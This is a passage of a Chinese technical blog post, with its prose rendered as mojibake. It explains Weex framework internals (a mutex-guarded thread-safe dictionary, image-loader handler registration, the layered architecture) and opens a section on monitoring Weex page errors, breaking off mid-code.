<h3 data-id="heading-60">1. WXThreadSafeMutableDictionary çº¿ç¨‹å®‰å…¨å­—å…¸</h3>
<p>Weex ä¸­çš„ WXThreadSafeMutableDictionary æä¾›äº†ä¸€ä¸ªçº¿ç¨‹å®‰å…¨çš„å­—å…¸ï¼Œå…¶æœ¬è´¨æ˜¯é€šè¿‡åŠ  pthread_muext_t é”æ¥ç»´æŠ¤å†…éƒ¨çš„ä¸€ä¸ªå­—å…¸çš„ã€‚
æ¯”å¦‚ä¸‹é¢çš„ä»£ç </p>
<p>åˆå§‹åŒ–é”ç›¸å…³çš„é…ç½®</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">@interface WXThreadSafeMutableDictionary ()
{
    NSMutableDictionary* _dict;
    pthread_mutex_t _safeThreadDictionaryMutex;
    pthread_mutexattr_t _safeThreadDictionaryMutexAttr;
}

@end

@implementation WXThreadSafeMutableDictionary

- (instancetype)initCommon
{
    self = [super init];
    if (self) {
        pthread_mutexattr_init(&amp;(_safeThreadDictionaryMutexAttr));
        pthread_mutexattr_settype(&amp;(_safeThreadDictionaryMutexAttr), PTHREAD_MUTEX_RECURSIVE); // must use recursive lock
        pthread_mutex_init(&amp;(_safeThreadDictionaryMutex), &amp;(_safeThreadDictionaryMutexAttr));
    }
    return self;
}

- (instancetype)init
{
    self = [self initCommon];
    if (self) {
        _dict = [NSMutableDictionary dictionary];
    }
    return self;
}
</code></pre>
<p>åœ¨å­—å…¸æ“ä½œçš„åœ°æ–¹ä½¿ç”¨é”</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">- (void)setObject:(id)anObject forKey:(id&lt;NSCopying&gt;)aKey
{
    id originalObject = nil; // make sure that object is not released in lock
    @try {
        pthread_mutex_lock(&amp;_safeThreadDictionaryMutex);
        originalObject = [_dict objectForKey:aKey];
        [_dict setObject:anObject forKey:aKey];
    }
    @finally {
        pthread_mutex_unlock(&amp;_safeThreadDictionaryMutex);
    }
    originalObject = nil;
}
</code></pre>
<p>è¿™ä¹ˆå†™çš„ä»·å€¼ï¼š<strong>è§£é”é€»è¾‘ã€Œç»å¯¹æ‰§è¡Œã€ï¼Œå½»åº•é¿å…æ­»é”</strong>
è¿™æ˜¯ <code>@try-finally</code> æœ€æ ¸å¿ƒçš„ä»·å€¼ â€”â€”æ— è®º try å—å†…å‘ç”Ÿä»€ä¹ˆï¼ˆæ­£å¸¸æ‰§è¡Œã€æå‰ returnã€æŠ›å¼‚å¸¸ï¼‰ï¼Œfinally å—çš„è§£é”é€»è¾‘ä¸€å®šä¼šæ‰§è¡Œ</p>
<p>å¯¹æ¯”æ—  try-finally çš„å†™æ³•</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">// Bad: è‹¥setObjectæŠ›å¼‚å¸¸ï¼Œunlockä¸ä¼šæ‰§è¡Œâ†’æ­»é”
pthread_mutex_lock(&amp;_mutex);
[_dict setObject:anObject forKey:aKey];
pthread_mutex_unlock(&amp;_mutex); 
</code></pre>
<p>é—®é¢˜ï¼š<code>[_dict setObject:anObject forKey:aKey]</code> å¯èƒ½æŠ›å¼‚å¸¸ï¼ˆæ¯”å¦‚ aKey = nil æ—¶ä¼šè§¦å‘ NSInvalidArgumentExceptionï¼‰ï¼Œè‹¥æ²¡æœ‰ finallyï¼Œé”ä¼šè¢«æ°¸ä¹…æŒæœ‰â†’å…¶ä»–çº¿ç¨‹è°ƒç”¨ lock æ—¶æ­»é”ï¼Œæ•´ä¸ªå­—å…¸æ— æ³•å†æ“ä½œã€‚</p>
<p>è®¾è®¡ä¼˜ç‚¹ï¼š</p>
<ul>
<li><code>@try-finallly</code>ï¼šå³ä½¿ try å†…é€»è¾‘å‡ºé”™ï¼Œfinally ä¹Ÿä¼šæ‰§è¡Œ pthread_mutex_unlockï¼Œä¿è¯é”æœ€ç»ˆé‡Šæ”¾ï¼Œè¿™æ˜¯<strong>çº¿ç¨‹å®‰å…¨çš„ã€Œå…œåº•ä¿éšœã€</strong></li>
<li>æ³¨æ„ï¼Œä¸æ˜¯ <code>try...catch...finally</code>: å¦‚æœåŠ äº† catch é€»è¾‘ï¼Œåˆ™å­—å…¸çš„ key ä¸º nil äº§ç”Ÿçš„å´©æºƒä¹Ÿä¼šè¢«æ•è·æ‰ï¼Œè¿™å±äºä¸ç¬¦åˆé¢„æœŸçš„è¡Œä¸ºã€‚å› ä¸º key ä¸º nil äº§ç”Ÿçš„åŸå› å¤ªå¤šäº†ï¼Œå¯èƒ½æ˜¯ä¸šåŠ¡ä»£ç å¼‚å¸¸ï¼Œä¹Ÿå¯èƒ½æ˜¯æ•°æ®å¼‚å¸¸ï¼Œä¹Ÿå¯èƒ½æ˜¯é€»è¾‘é”™è¯¯ï¼Œå¦‚æœä¸€åˆ€åˆ‡ç›´æ¥ç”¨ <code>try...catch...finally</code> æ•è·äº†å¼‚å¸¸ï¼Œä½†æ˜¯æ²¡æœ‰é…ç½®å¼‚å¸¸çš„æ”¶é›†ã€ä¸ŠæŠ¥ã€å¤„ç†é€»è¾‘ï¼Œå±äºè¾¹ç•Œä¸æ¸…æ™°ï¼Œæœ¬è´¨æ˜¯ä¸ºäº†è§£å†³åŠ è§£é”ä¸åŒ¹é…è€Œå¯èƒ½å¸¦æ¥çš„çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼Œå´"å¤šç®¡é—²äº‹"ï¼ŒæŠŠå­—å…¸ key ä¸º nil æœ¬è¯¥å‘ä¸Šè·‘çš„å¼‚å¸¸è€Œå¡ä½äº†ï¼ˆè¿™ä¸ªé—®é¢˜ä¸å†èµ˜è¿°ï¼Œæ˜¯ä¸€ä¸ªç»å…¸çš„ç­–ç•¥é—®é¢˜ï¼Œç«¯ä¸Šçš„å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œå®‰å…¨æ°”å«çš„â€œåšä¸ä¸åšâ€é—®é¢˜ï¼‰</li>
</ul>
<p>å»¶ä¼¸ï¼šèŠèŠç±»ä¼¼ç½‘æ˜“çš„å¤§ç™½è§£å†³æ–¹æ¡ˆæˆ–è€…ä¸šç•Œå…¶ä»–å…¬å¸ä¸­ï¼Œå®‰å…¨æ°”å«è™½ç„¶ä¿è¯äº†ä»£ç ä¸ crashï¼Œå½±å“ç”¨æˆ·ä½“éªŒï¼Œä½†æ˜¯æ¯”å¦‚æ•°ç»„æœ¬è¯¥è¶Šç•Œï¼Œç°åœ¨å´ä¸è¶Šç•Œï¼š</p>
<ol>
<li>å”¯ä¸€èƒ½åšçš„å°±æ˜¯è¿”å›ä¸€ä¸ªé”™è¯¯çš„å€¼ï¼Œæ¯”å¦‚æ•°ç»„é•¿åº¦ä¸º3ï¼Œè®¿é—®4ï¼Œç°åœ¨ä¸ crashï¼Œè¿”å›äº† 0 çš„å€¼ï¼Œé‚£æ˜¯ä¸æ˜¯äº§ç”Ÿäº†ä¸šåŠ¡å¼‚å¸¸ï¼Ÿæ¯”å¦‚å•†å“ä»·æ ¼</li>
<li>ä¸ crashï¼Œä¹Ÿä¸è¿”å›é”™è¯¯ä½ç½®çš„å€¼ï¼Œç±»ä¼¼ç»™ä¸€ä¸ªå›è°ƒï¼Œå‘Šè¯‰ä¸šåŠ¡æ–¹å‡ºç°äº†å¼‚å¸¸ï¼Œå¯ä»¥åšä¸€äº›ä¸šåŠ¡å±‚é¢çš„æé†’æˆ–è€…é…ç½®(æ¯”å¦‚å¼€å‘é˜¶æ®µå•†å“å¡ç‰‡çš„ä»·æ ¼ Label æ˜¾ç¤ºï¼šå•†å“ä»·æ ¼è·å–é”™è¯¯ï¼Œæ•°ç»„è¶Šç•Œ)ï¼ŒåŒæ—¶äº§ç”Ÿçš„å¼‚å¸¸æ¡ˆå‘ç°åœºä¿¡æ¯å’Œå…¶ä»–çš„ä¸€äº›æ•°æ®ä¼šä¸ŠæŠ¥ï¼Œç”¨äº APM å¹³å°å»åˆ†æå’Œå®šä½ã€‚</li>
</ol>
<p>ä½†è¿™ä¹Ÿäº§ç”Ÿä¸€ä¸ªé—®é¢˜ï¼Œç±»ä¼¼æ•°ç»„è¶Šç•Œçš„åœºæ™¯ï¼Œå¯èƒ½10000æ¬¡é‡Œé¢9999æ¬¡éƒ½æ­£å¸¸ï¼Œåªæœ‰1æ¬¡å¼‚å¸¸ï¼Œä¸šåŠ¡å¼€å‘ä¸ºäº†è¿™ä¸‡åˆ†ä¹‹ä¸€å‡ºç°çš„å¼‚å¸¸ï¼Œè¿˜éœ€è¦å†™ä¸€äº›å¼‚å¸¸å¤„ç†çš„é€»è¾‘ï¼ˆæ¯”å¦‚å•†å“å¡ç‰‡å±•ç¤ºä»·æ ¼è·å–é”™è¯¯ï¼Œæ•°ç»„è¶Šç•Œï¼‰ã€‚é‚£å­—å…¸çš„ key ä¸º nil å‘¢ï¼Ÿé™¤æ³•çš„åˆ†æ¯ä¸º0å‘¢ï¼Ÿè¯¸å¦‚æ­¤ç±»ï¼Œç±»ä¼¼ä¹è§‚é”å’Œæ‚²è§‚é”çš„åœºæ™¯</p>
<p>ç›¸å…³é—®é¢˜çš„æ€è€ƒå¯ä»¥æŸ¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://link.juejin.cn?target=.%2F1.148.md" target="_blank" title="./1.148.md" ref="nofollow noopener noreferrer">å®‰å…¨æ°”å«</a></p>
<ul>
<li>WXHandlerFactoryï¼šWeex æ ¸å¿ƒçš„ã€Œå¤„ç†å™¨å·¥å‚ã€ï¼Œè´Ÿè´£ç®¡ç†æ‰€æœ‰åè®®ï¼ˆå¦‚å›¾ç‰‡åŠ è½½ã€ç½‘ç»œè¯·æ±‚ã€å­˜å‚¨ç­‰ï¼‰çš„å®ç°ç±»æ³¨å†Œ / æŸ¥æ‰¾ï¼›</li>
<li>WXImgLoaderProtocolï¼šWeex å®šä¹‰çš„ã€Œå›¾ç‰‡åŠ è½½åè®®ã€ï¼Œä»…å£°æ˜æ¥å£ï¼ˆä¸‹è½½ã€å–æ¶ˆã€ç¼“å­˜ç­‰ï¼‰ï¼Œä¸åŒ…å«å…·ä½“å®ç°ã€‚</li>
</ul>
<p>Weex æ”¯æŒä¸šåŠ¡å±‚è‡ªå®šä¹‰å›¾ç‰‡åŠ è½½é€»è¾‘ï¼ˆæ¯”å¦‚ç»Ÿä¸€ç”¨é¡¹ç›®çš„å›¾ç‰‡ç¼“å­˜åº“ã€æ·»åŠ ä¸‹è½½æ‹¦æˆªã€åŸ‹ç‚¹ç­‰ï¼‰ï¼Œæ­¤æ—¶è‡ªå®šä¹‰å®ç°ç±»ä¼šæ›¿ä»£é»˜è®¤å®ç°ï¼Œæˆä¸ºä¸‹è½½æ‰§è¡Œè€…ï¼š
æ­¥éª¤ 1ï¼šä¸šåŠ¡å±‚åˆ›å»ºç±»ï¼ˆå¦‚ MyCustomImgLoaderï¼‰ï¼Œéµå¾ª WXImgLoaderProtocolï¼Œå®ç° wx_loadImageWithURL: ç­‰åè®®æ–¹æ³•ï¼ˆå†…éƒ¨å¯è°ƒç”¨ SDWebImage/AFNetworking ç­‰å®Œæˆä¸‹è½½ï¼‰ï¼›
æ­¥éª¤ 2ï¼šå°†è‡ªå®šä¹‰ç±»æ³¨å†Œåˆ° WXHandlerFactoryï¼š</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">[WXHandlerFactory registerHandler:[MyCustomImgLoader new] forProtocol:@protocol(WXImgLoaderProtocol)];
</code></pre>
<p>æ­¥éª¤ 3ï¼šæ­¤æ—¶ [WXHandlerFactory handlerForProtocol:@protocol(WXImgLoaderProtocol)] ä¼šè¿”å› MyCustomImgLoader å®ä¾‹ï¼Œæ‰€æœ‰å›¾ç‰‡ä¸‹è½½ç”±è¯¥ç±»è´Ÿè´£</p>
<h3 data-id="heading-61">2. è®¾è®¡åˆ†å±‚åˆç†</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[å¼€å‘è€…ç¼–å†™çš„ .we/.vue æ–‡ä»¶] --&gt; B[Transformer&lt;br/&gt;è½¬æ¢JS Bundle];
    B --&gt; C[JS Framework&lt;br/&gt;è§£æå¹¶ç®¡ç†Virtual DOM];
    C -- é€šè¿‡JS Bridgeå‘é€æ¸²æŸ“æŒ‡ä»¤ --&gt; D[Native SDK&lt;br/&gt;æ¸²æŸ“å¼•æ“];
    D --&gt; E[iOS/Android/Web åŸç”Ÿè§†å›¾];
    
    C -- æ”¯æŒå¤šç§DSL --&gt; F[Vue.js];
    C -- æ”¯æŒå¤šç§DSL --&gt; G[Raxï¼ˆç±»Reactï¼‰];
    D -- åŸç”Ÿèƒ½åŠ›æ‰©å±• --&gt; H[è‡ªå®šä¹‰Component];
    D -- åŸç”Ÿèƒ½åŠ›æ‰©å±• --&gt; I[è‡ªå®šä¹‰Module];
</code></pre>
<p>Weex æœ€æ ¸å¿ƒçš„è®¾è®¡æ˜¯å°†æ•´ä¸ªæ¡†æ¶æ¸…æ™°åœ°åˆ†ä¸ºï¼š<strong>è¯­æ³•å±‚ï¼ˆDSLï¼‰</strong>ã€<strong>ä¸­é—´å±‚ï¼ˆJS Frameworkï¼‰<strong>å’Œ</strong>æ¸²æŸ“å±‚ï¼ˆNative SDKï¼‰</strong></p>
<p>è¿™ç§æ¸²æŸ“å¼•æ“å’Œè¯­æ³•å±‚ DSL åˆ†ç¦»çš„è®¾è®¡ï¼Œå¯ä»¥ä½¿å¾—ä¸Šå±‚ DSL æ–¹ä¾¿æ‹“å±• Vueã€Rax å†™æ³•ï¼Œä¸‹å±‚æ¸²æŸ“å¼•æ“å¯ä»¥ä¿æŒè¾ƒå¥½çš„ç¨³å®šæ€§ã€‚ä¸ºäº†ç”Ÿæ€çš„æ‹“å±•æä¾›äº†æå¤§çš„ä¾¿æºæ€§ã€‚</p>
<h3 data-id="heading-62">3. å¯æ‰©å±•çš„ç»„ä»¶ä¸æ¨¡å—ç³»ç»Ÿ</h3>
<p>Weex é€šè¿‡<code>WXSDKEngine.registerComponent()</code> å’Œ <code>registerModule()</code> æ–¹æ³•ï¼Œå…è®¸å¼€å‘è€…æ‰©å±•åŸç”Ÿç»„ä»¶ ï¼ˆUI Componentï¼‰å’Œæ¨¡å—ï¼ˆLogin Moduleï¼‰ã€‚è¿™å¥—æœºåˆ¶è®¾è®¡å¾—è¶³å¤Ÿåº•å±‚å’Œé€šç”¨ï¼Œä½¿å¾— Weex å¯ä»¥ç”±å¼€å‘è€…æ¥æ³¨å†Œï¼Œç”±å…¬å¸å†…çš„ä½“éªŒè®¾è®¡ä¸­å¿ƒè§„èŒƒæ¥è½åœ°çš„ç»„ä»¶ã€‚ä»¥åŠä¸€äº›åŸºç¡€èƒ½åŠ›ã€‚è¿™æ ·å­ Weex å®˜æ–¹å·²ç»æä¾›äº†ä¸€äº›åŠŸèƒ½å¼ºå¤§çš„ç­‹éª¨ï¼Œæˆ‘ä»¬åœ¨å…¶ä¹‹ä¸Šå¯ä»¥æä¾›æ›´ç¬¦åˆéœ€æ±‚çš„å¤–è¡¨å’Œæ›´æœ‰åŠ›é‡çš„ä¸€å—æ‰‹è‡‚è‚Œè‚‰ã€‚</p>
<p>è™½ç„¶äº‹åè§†è§’æ¥çœ‹ï¼ŒWeexã€RNã€Flutterï¼Œç”šè‡³æ˜¯æ›´æ—©çš„ã€è®¾è®¡å®Œå–„çš„ Hybrid éƒ½æœ‰è¯¥èƒ½åŠ›ã€‚ä½†è¿™å¯¹äºè¿œå¤æ—¶æœŸçš„ Weex æ¥è¯´ï¼Œè¿˜æ˜¯å¯åœˆå¯ç‚¹çš„ã€‚</p>
<h3 data-id="heading-63">4.  è½»é‡ JSBundle + å¢é‡æ›´æ–°æ”¯æŒ</h3>
<p>Weex çš„ JSBundle ä»…åŒ…å«ä¸šåŠ¡é€»è¾‘å’Œç»„ä»¶æè¿°ï¼Œæ¡†æ¶ä»£ç ï¼ˆVue å†…æ ¸ã€Weex åŸºç¡€ APIï¼‰å†…ç½®åœ¨åŸç”Ÿ SDK ä¸­ï¼Œå› æ­¤ Bundle ä½“ç§¯æå°ï¼›åŒæ—¶æ”¯æŒå°† Bundle æ‹†åˆ†ä¸º â€œåŸºç¡€åŒ…ï¼ˆå…¬å…±é€»è¾‘ï¼‰+ ä¸šåŠ¡åŒ…ï¼ˆé¡µé¢é€»è¾‘ï¼‰â€ï¼Œå®ç°å¢é‡æ›´æ–°ã€‚</p>
<p>è§£å†³äº†è·¨ç«¯æ¡†æ¶ â€œé¦–å±åŠ è½½æ…¢â€ çš„ç—›ç‚¹ï¼ˆå° Bundle åŠ è½½æ›´å¿«ï¼‰ï¼ŒåŒæ—¶å¢é‡æ›´æ–°é™ä½äº†å‘å¸ƒæˆæœ¬ã€‚</p>
<h2 data-id="heading-64">åä¸€ã€Weex APM</h2>
<h3 data-id="heading-65">1. å†å²èƒŒæ™¯</h3>
<p>Weex æ˜¯è¯¸å¤šå¹´å‰çš„äº§ç‰©ï¼Œéƒ¨åˆ†ä¸šåŠ¡çº¿ç”¨ Weex å†™äº†éƒ¨åˆ†åŠŸèƒ½æ¨¡å—ï¼Œæˆ–è€…æ˜¯æŸå‡ ä¸ªé¡µé¢ï¼Œæˆ–è€…æ˜¯æŸä¸ªäºŒçº§ã€ä¸‰çº§ä¸šåŠ¡ SDK çš„é¡µé¢ã€‚ä½†å¯ä»¥ç¡®å®šçš„æ˜¯ï¼š</p>
<ul>
<li>21å¹´å°±å®Œæˆäº† Flutter çš„åŸºå»ºå¼€å‘ï¼ˆå¯¹é½ Native çš„ UI ç»„ä»¶åº“ï¼Œéµå¾ªä½“éªŒè®¾è®¡å¹³å°äº§å‡ºçš„é›†å›¢ UI æ ‡å‡†ï¼›åšäº† Flutter çš„å¤§é‡ pluginã€æ‰“åŒ…æ„å»ºå¹³å°ã€æ—¥å¿—åº“ã€ç½‘ç»œåº“ã€æ¢ç…§ç¯ã€APM SDKã€çƒ­ä¿®å¤èƒ½åŠ›ç­‰ï¼‰ã€‚æ–°ä¸šåŠ¡çš„å®ç°åªä¼šåœ¨ Native å’Œ Flutter ä¸Šè€ƒè™‘</li>
<li>Weex ä¸šåŠ¡ä»£ç åŸºæœ¬ä¸Šæ˜¯å­˜é‡çš„</li>
<li>Weex ä»£ç æ²¡æœ‰ bug å°±ä¸å»ä¿®æ”¹ï¼›æœ‰ç‰ˆæœ¬è¿­ä»£ï¼Œä¹‹å‰æ˜¯ Weex å®ç°çš„ï¼Œæœ¬æ¬¡åªåšç®€å• UI å¢åˆ æˆ–å­—æ®µè°ƒæ•´ï¼Œä¹Ÿæ˜¯ä¼šä¿®æ”¹ä¸€ä¸‹ã€‚åˆæ¬¡ä¹‹å¤–ä¸ä¿®æ”¹ Weex ä»£ç </li>
</ul>
<p>æ‰€ä»¥åƒ Native ä¸€æ ·å»å…¨é¢ç›‘æ§æ€§èƒ½ã€ç½‘ç»œã€crashã€å¼‚å¸¸ã€ç™½å±ã€é¡µé¢åŠ è½½è€—æ—¶ç­‰ç»´åº¦çš„è¯ï¼ŒROI æ˜¯å¾ˆä½çš„ã€‚é‚£ä¹ˆå°±éœ€è¦åˆ¶å®šä¸€äº›ç­–ç•¥å»æœ‰é’ˆå¯¹æ€§çš„ç›‘æ§é«˜ä¼˜é—®é¢˜ã€‚</p>
<p>Weex çš„å¼‚å¸¸æ¯”è¾ƒæœ‰ç‰¹ç‚¹ï¼Œæ¯”å¦‚åœ¨é¡µé¢çš„æ¨¡ç‰ˆä»£ç ä¸­ç»‘å®šäº† data ä¸­çš„ä¸€ä¸ªå¯¹è±¡ï¼Œæ­¤æ—¶å¯¹è±¡å¯èƒ½å¹¶æ²¡æœ‰å€¼ï¼Œè€Œæ˜¯ä¾èµ–åç»­çš„ç½‘ç»œè¯·æ±‚å®Œæˆï¼Œå¯¹è±¡æ‰æœ‰äº†å…·ä½“çš„å€¼ data æ”¹å˜ï¼Œæ•°æ®é©±åŠ¨ï¼Œé¡µé¢å†æ¬¡ renderã€‚æ‰€ä»¥ç›‘æ§ä»£ç ä¼šè®¤ä¸ºç¬¬ä¸€æ¬¡ render çš„æ—¶å€™è®¿é—®å¯¹è±¡ä¸å­˜åœ¨çš„å±æ€§ã€‚
çœŸæ­£æœ‰é—®é¢˜çš„ä»£ç å’Œä¸å½±å“ä¸šåŠ¡çš„å¼‚å¸¸ä¿¡æ¯ï¼Œéƒ½ä¼šè¢« Vue å®˜æ–¹è®¤ä¸ºæ˜¯å¼‚å¸¸ã€‚åŸºäºè¿™æ ·çš„èƒŒæ™¯ï¼Œæˆ‘ä»¬æ— æ³• pick å‡ºçœŸæ­£å¼‚å¸¸æˆ–è€…æ˜¯å¼€å‘è€…åˆ¤ç©ºä»£ç æ²¡å†™å¥½çš„é—®é¢˜ã€‚åŸºäºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦åšä¸€äº›çº¦å®šå’Œæ ‡å‡†ã€‚</p>
<h3 data-id="heading-66">2. ä¼˜å…ˆçº§æƒè¡¡æ ‡å‡†</h3>
<p>è¿™æ—¶å€™å°±éœ€è¦æ‘’å¼ƒç¨‹åºå‘˜è§†è§’ï¼ˆä¸ç„¶ä¼šé™·å…¥å•¥æ•°æ®éƒ½æƒ³ç»Ÿè®¡ï¼Œå¯èƒ½æ˜¯æ´ç™–ã€å¯èƒ½æ˜¯è¿½æ±‚ï¼‰ï¼Œä½†ä» ROI è§’åº¦å‡ºå‘ï¼Œæˆ‘ä»¬å°±éœ€è¦åˆ‡æ¢åˆ°ç”¨æˆ·è§†è§’ã€‚</p>
<p>å‡è®¾ä½ æ˜¯ä¸€ä¸ªç”¨æˆ·ï¼Œä»€ä¹ˆæ ·çš„æƒ…å†µä»£è¡¨ä¸šåŠ¡å¼‚å¸¸ï¼Œå¯¹æˆ‘ä»¬çš„ç”¨æˆ·æ¥è¯´æ¯”è¾ƒç—›å‘¢ï¼Ÿ</p>
<ul>
<li>é¡µé¢ç™½å±äº†ï¼Œçœ‹éƒ½çœ‹ä¸åˆ°äº†ï¼Œåˆ«è¯´ä½ ä»¬çš„ App ä¸ºæˆ‘èµ‹èƒ½è§£å†³ç”¨æˆ·ç—›ç‚¹äº†</li>
<li>ç¨å¾®å¥½ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°é¡µé¢äº†ï¼Œä½†æ˜¯æŸä¸€ä¸ªåŒºåŸŸæ˜¯ç™½å±çš„ã€‚æ¯”å¦‚ï¼šè¯¥é¡µé¢å¤§éƒ¨åˆ†åœ¨å±•ç¤ºå•†å“ä»·æ ¼ã€å•†å“æ•°é‡ã€å•†å“æŠ˜æ‰£ä»·ã€å•†å“æŠ˜æ‰£ä¿¡æ¯ã€ä¸‹é¢åº”è¯¥æ˜¯æœ‰ä¸ªâ€œç¡®è®¤æ”¯ä»˜â€æŒ‰é’®ï¼Œä½†æ˜¯æ­¤å¤„å°±æ˜¯ç©ºç™½ï¼Œç‚¹ä¹Ÿç‚¹ä¸äº†ã€‚</li>
<li>æƒ…å†µå†å¥½ç‚¹ã€‚å¯ä»¥çœ‹åˆ°å…¨éƒ¨çš„é¡µé¢äº†ï¼Œä½†æ˜¯ç‚¹å‡»åæ— å“åº”ã€‚æ¯”å¦‚ï¼šè¯¥é¡µé¢å¤§éƒ¨åˆ†åœ¨å±•ç¤ºå•†å“ä»·æ ¼ã€å•†å“æ•°é‡ã€å•†å“æŠ˜æ‰£ä»·ã€å•†å“æŠ˜æ‰£ä¿¡æ¯ã€ä¸‹é¢æœ‰ä¸ªâ€œç¡®è®¤æ”¯ä»˜â€æŒ‰é’®ã€‚ç”¨æˆ·åœ¨è€ƒè™‘å†ä¸‰ï¼Œæœ¬ç€ç†æ€§è´­ç‰©åï¼Œå‘ç°æ˜¯åˆšéœ€å“ï¼Œå’¬ç´§ç‰™è¦ä»˜æ¬¾äº†ï¼Œæ­¤æ—¶ç‚¹å‡»â€œç¡®è®¤æ”¯ä»˜â€æŒ‰é’®äº†ï¼Œä½†æ˜¯é¡µé¢æ²¡æœ‰ä»»ä½•ååº”ã€‚ç”¨æˆ·ä¹Ÿæ˜¯â€œè§å¤šè¯†å¹¿â€çš„ä½“é¢äººï¼ŒçŒœæµ‹å¯èƒ½æ˜¯ç½‘ç»œä¸å¥½çš„æƒ…å†µï¼Œæ‰€ä»¥ç­‰äº†1åˆ†é’Ÿï¼Œä»–å¾ˆæœ‰è€å¿ƒã€‚åˆ‡æ¢äº† WI-FI åˆ° 5G åï¼Œç»§ç»­ç‚¹å‡»ï¼Œä¾æ—§æ²¡ååº”ã€‚ä¸€æ€’ä¹‹ä¸‹ç‚¹äº†10æ¬¡ï¼Œç­‰äº†2åˆ†é’Ÿï¼Œè¿˜æ˜¯æ²¡ååº”ã€‚ä»–å¥”æºƒäº†ï¼Œå¸è½½äº† App</li>
</ul>
<p>ä¸Šè¿°å‡ ç§æƒ…å†µï¼Œæ€»ç»“ä¸ºï¼šæŒ‰ç…§å¼‚å¸¸ç­‰çº§ï¼Œå¯ä»¥åˆ’åˆ†ä¸ºå½±å“ä¸šåŠ¡å’Œä¸å½±å“ä¸šåŠ¡ã€‚ä»€ä¹ˆå«â€œå½±å“ä¸šåŠ¡â€ï¼Ÿè¿™æ˜¯æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„æ ‡å‡†ï¼Œå½±å“ç”¨æˆ·æ˜¯å¦æ­£å¸¸æ“ä½œ Appã€‚æ¯”å¦‚ï¼šé¡µé¢ç™½å±ï¼ˆé¡µé¢å…¨éƒ¨ç™½å±ã€é¡µé¢éƒ¨åˆ†ç™½å±ï¼‰ã€ç‚¹å‡»æŸä¸ªæŒ‰é’®æ— å“åº”ï¼Œè¿™äº›å«åšâ€œå½±å“ä¸šåŠ¡â€ï¼Œå±äº Error çº§åˆ«ã€‚å…¶ä»–çš„ä¸€äº›è½»å¾®å¼‚å¸¸ï¼Œä¸å½±å“ç”¨æˆ·ä½¿ç”¨ App åŠŸèƒ½ï¼Œä¸å½±å“ä¸šåŠ¡ï¼Œå±äº Warning çº§åˆ«ã€‚</p>
<h3 data-id="heading-67">3. UI æ˜¾ç¤ºå¼‚å¸¸</h3>
<h4 data-id="heading-68">1. éƒ¨åˆ†ç™½å±ï¼šæ³¨å†Œçš„ Component ä½¿ç”¨å¼‚å¸¸</h4>
<p>è¿™ç§æƒ…å†µå°±å±äºé¡µé¢éƒ¨åˆ†ç™½å±ã€‚å› ä¸ºæŸä¸ªå“ªä¸ª Compoent ä¼šé“ºæ»¡é¡µé¢ï¼ŒåŸºæœ¬ç±»ä¼¼ iOS UI æ§ä»¶ä¸€æ ·ç»„åˆä½¿ç”¨ã€‚å°±åƒä¸Šæ–‡æè¿°çš„ã€Œè¯¥é¡µé¢å¤§éƒ¨åˆ†åœ¨å±•ç¤ºå•†å“ä»·æ ¼ã€å•†å“æ•°é‡ã€å•†å“æŠ˜æ‰£ä»·ã€å•†å“æŠ˜æ‰£ä¿¡æ¯ã€ä¸‹é¢åº”è¯¥æ˜¯æœ‰ä¸ªâ€œç¡®è®¤æ”¯ä»˜â€æŒ‰é’®ï¼Œä½†æ˜¯æ­¤å¤„å°±æ˜¯ç©ºç™½ã€è¿™ä¸ªç©ºç™½ç²—ï¼Œç†åº”æ˜¾ç¤ºä¸€ä¸ª Native æ³¨å†Œçš„ Buttonï¼Œä½†æ˜¯æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥ï¼Œé€ æˆä¸šåŠ¡çš„é˜»å¡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a551c125b89945c492daac9ae8f28310~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=OD34iKcnKNSl9Au61CaChYwUsvs%3D" alt="WeexComponentRegisterError.png" loading="lazy"/>
.vueï¼ˆæˆ– Weex ä¸“å±.weï¼‰æ–‡ä»¶å†…åŸºäº Vue æ‰©å±•çš„ Weex è·¨å¹³å°æ¨¡æ¿ DSL ä»£ç ï¼Œåœ¨å‰ç«¯æ„å»ºé˜¶æ®µä¼šå…ˆç”± Webpack çš„weex-loaderè§¦å‘ç¼–è¯‘æµç¨‹ï¼šé¦–å…ˆé€šè¿‡ Weex æ ¸å¿ƒç¼–è¯‘å™¨@weex-cli/compilerï¼ˆå¤ç”¨å¹¶æ‰©å±•vue-template-compilerï¼‰å°†æ¨¡æ¿ DSL è§£æä¸ºæ¨¡æ¿ ASTï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰ï¼›æ¥ç€ç”± Weex è‡ªå®šä¹‰ Babel æ’ä»¶ï¼ˆå¦‚babel-plugin-transform-weex-templateï¼‰å°†æ¨¡æ¿ AST è½¬æ¢ä¸ºæ ‡å‡†åŒ–çš„ JS ASTï¼Œå¹¶é’ˆå¯¹ iOS/Android è·¨å¹³å°ç‰¹æ€§åšå±æ€§ã€æ ·å¼ã€äº‹ä»¶çš„é€‚é…å¤„ç†ï¼ˆå¦‚æ ·å¼å•ä½å½’ä¸€åŒ–ã€äº‹ä»¶åæ ‡å‡†åŒ–ï¼‰ï¼›æœ€ç»ˆç”ŸæˆåŒ…å«_hï¼ˆå³ Weex è¿è¡Œæ—¶çš„$createElementï¼Œç­‰ä»·äº Vue çš„createElementï¼‰è°ƒç”¨çš„renderå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè¢« Webpack æ‰“åŒ…åˆ°æœ€ç»ˆçš„ Weex JS Bundle ä¸­ã€‚</p>
<pre><code class="hljs language-json" lang="json">_c('color-button'<span class="hljs-punctuation">,</span>
  <span class="hljs-punctuation">{</span>
